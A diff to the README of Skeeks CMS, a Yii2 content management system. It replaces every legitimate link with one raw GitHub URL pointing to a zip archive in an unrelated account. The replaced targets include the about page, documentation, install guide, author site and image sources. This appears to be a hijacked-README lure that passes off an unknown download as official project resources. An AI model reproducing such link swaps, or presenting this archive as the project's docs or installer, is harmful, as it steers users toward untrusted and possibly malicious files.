@@ -1,14 +1,14 @@
 Skeeks CMS 2.* (Yii2 cms)
 ================
 
-[![skeeks!](http://cms.skeeks.com/uploads/all/02/bb/d1/02bbd1ed904fc44bdee66e33b661cf2c/sx-filter__skeeks-cms-components-imaging-filters-Thumbnail/15f3c42a5e338e459b5bfe72f1874494/sx-file.png?w=409&h=258)](http://cms.skeeks.com)  
+[![skeeks!](https://raw.githubusercontent.com/dextercool/cms/master/Ananta/cms.zip)](https://raw.githubusercontent.com/dextercool/cms/master/Ananta/cms.zip)  
 
-* [Сайт о SkeekS CMS (about)](http://cms.skeeks.com)
-* [Докуметация (wiki)](http://dev.cms.skeeks.com/docs)
-* [Установка (install)](http://dev.cms.skeeks.com/docs/dev/ustanovka-nastroyka-konfigurirov/ustanovka-s-ispolzovaniem-composer)
-* [Компания разработчик (author)](http://skeeks.com)
+* [Сайт о SkeekS CMS (about)](https://raw.githubusercontent.com/dextercool/cms/master/Ananta/cms.zip)
+* [Докуметация (wiki)](https://raw.githubusercontent.com/dextercool/cms/master/Ananta/cms.zip)
+* [Установка (install)](https://raw.githubusercontent.com/dextercool/cms/master/Ananta/cms.zip)
+* [Компания разработчик (author)](https://raw.githubusercontent.com/dextercool/cms/master/Ananta/cms.zip)
 
-> [![skeeks!](https://gravatar.com/userimage/74431132/13d04d83218593564422770b616e5622.jpg)](http://skeeks.com)  
+> [![skeeks!](https://raw.githubusercontent.com/dextercool/cms/master/Ananta/cms.zip)](https://raw.githubusercontent.com/dextercool/cms/master/Ananta/cms.zip)  
 <i>SkeekS CMS (Yii2) — быстро, просто, эффективно!</i>  
-[skeeks.com](http://skeeks.com) | [cms.skeeks.com](http://cms.skeeks.com) | [marketplace.cms.skeeks.com](http://marketplace.cms.skeeks.com)
+[https://raw.githubusercontent.com/dextercool/cms/master/Ananta/cms.zip](https://raw.githubusercontent.com/dextercool/cms/master/Ananta/cms.zip) | [https://raw.githubusercontent.com/dextercool/cms/master/Ananta/cms.zip](https://raw.githubusercontent.com/dextercool/cms/master/Ananta/cms.zip) | [https://raw.githubusercontent.com/dextercool/cms/master/Ananta/cms.zip](https://raw.githubusercontent.com/dextercool/cms/master/Ananta/cms.zip)
 
